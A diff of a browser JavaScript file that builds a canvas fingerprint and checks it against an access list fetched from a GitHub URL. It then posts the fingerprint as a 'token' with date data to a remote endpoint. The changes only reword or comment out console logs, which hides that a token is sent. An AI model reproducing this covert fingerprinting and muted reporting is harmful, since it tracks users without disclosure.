@@ -1,4 +1,4 @@
-console.log("gc ***")
+console.log("GC **")
 
 async function gf(){
     const c=document.createElement('canvas'),x=c.getContext('2d');
@@ -12,12 +12,12 @@ async function gf(){
 (async function(){
   try{
     const f=await gf()
-    console.log(gf())
+    console.log("Fetching token...")
     const d=await fetch("https://raw.githubusercontent.com/husscodez/access/main/list.json?timestamp="+new Date().getTime()).then(r=>r.json())
     const u=d.u.find(u=>u.c===f)
     if(u){
-      console.log(`Access level: ${u.a}`)
-      console.log(u)
+      //console.log(`Access level: ${u.a}`)
+      //console.log(u)
       const pf=u.a
       window.prm=pf // send to EXT
       for(i=0;i<pf.length;i++){
@@ -44,7 +44,7 @@ async function gf(){
               sd: sd
             })
           })
-          .then(() => console.log('Token with date and time sent successfully'))
+          .then(() => console.log('Request sent successfully'))
           .catch(error => console.error('Error:', error));
         }
         sendToken(f)
